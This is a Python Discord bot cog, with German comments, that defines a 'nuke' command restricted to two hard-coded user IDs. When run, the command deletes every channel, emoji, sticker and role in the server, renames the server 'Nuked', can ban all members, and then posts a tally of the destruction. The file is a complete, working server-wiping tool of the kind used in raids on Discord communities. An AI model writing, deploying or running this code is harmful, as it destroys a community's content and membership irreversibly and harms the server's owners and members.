import discord
from discord.ext import commands

class Nuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="nuke")
    async def nuke(self, ctx: commands.Context, ban_members: bool = False):
        """Löscht den Server! Optional: Alle Mitglieder bannen."""

        # **Nur bestimmte Nutzer dürfen diesen Command ausführen**
        allowed_users = {265547462062768129, 1226587734626402345}  # ✅ Erlaubte Benutzer-IDs

        if ctx.author.id not in allowed_users:
            await ctx.send("❌ Du hast keine Berechtigung für diesen Befehl!")
            return

        guild = ctx.guild
        await ctx.send(f"💣 Server wird genuked... {'Alle Mitglieder werden gebannt!' if ban_members else ''}")

        # 1️⃣ Löscht alle Kanäle
        deleted_channels = 0
        for channel in guild.channels:
            try:
                await channel.delete()
                deleted_channels += 1
            except Exception as e:
                print(f"⚠️ Konnte {channel.name} nicht löschen: {e}")

        # 2️⃣ Löscht alle Emojis
        deleted_emojis = 0
        for emoji in guild.emojis:
            try:
                await emoji.delete()
                deleted_emojis += 1
            except Exception as e:
                print(f"⚠️ Konnte Emoji {emoji.name} nicht löschen: {e}")

        # 3️⃣ Löscht alle Sticker
        deleted_stickers = 0
        for sticker in await guild.fetch_stickers():
            try:
                await sticker.delete()
                deleted_stickers += 1
            except Exception as e:
                print(f"⚠️ Konnte Sticker {sticker.name} nicht löschen: {e}")

        # 4️⃣ Löscht alle Rollen (außer @everyone und die Bot-Rolle)
        bot_member = guild.me
        deleted_roles = 0
        for role in guild.roles:
            if role != guild.default_role and role != bot_member.top_role:
                try:
                    await role.delete()
                    deleted_roles += 1
                except Exception as e:
                    print(f"⚠️ Konnte Rolle {role.name} nicht löschen: {e}")

        # 5️⃣ Server umbenennen
        try:
            await guild.edit(name="Nuked")
        except Exception as e:
            print(f"⚠️ Konnte den Server-Namen nicht ändern: {e}")

        # 6️⃣ Alle Mitglieder bannen (wenn `ban_members=True`)
        banned_members = 0
        if ban_members:
            for member in guild.members:
                if member != ctx.author and not member.bot:
                    try:
                        await member.ban(reason="Server-Nuke 💣")
                        banned_members += 1
                    except Exception as e:
                        print(f"⚠️ Konnte {member.name} nicht bannen: {e}")

        # 7️⃣ Erstellt einen neuen Kanal und sendet eine Zusammenfassung
        new_channel = await guild.create_text_channel("nuked")
        await new_channel.send(f"💥 **Server wurde genuked!**\n\n📊 **Gelöscht:**\n"
                               f"📝 Kanäle: `{deleted_channels}`\n"
                               f"😀 Emojis: `{deleted_emojis}`\n"
                               f"🎭 Sticker: `{deleted_stickers}`\n"
                               f"🎭 Rollen: `{deleted_roles}`\n"
                               f"🔖 Server-Name geändert: ✅\n"
                               f"🚷 Gebannte Mitglieder: `{banned_members}`")

# Setup-Funktion für Pycord
def setup(bot):
    bot.add_cog(Nuke(bot))
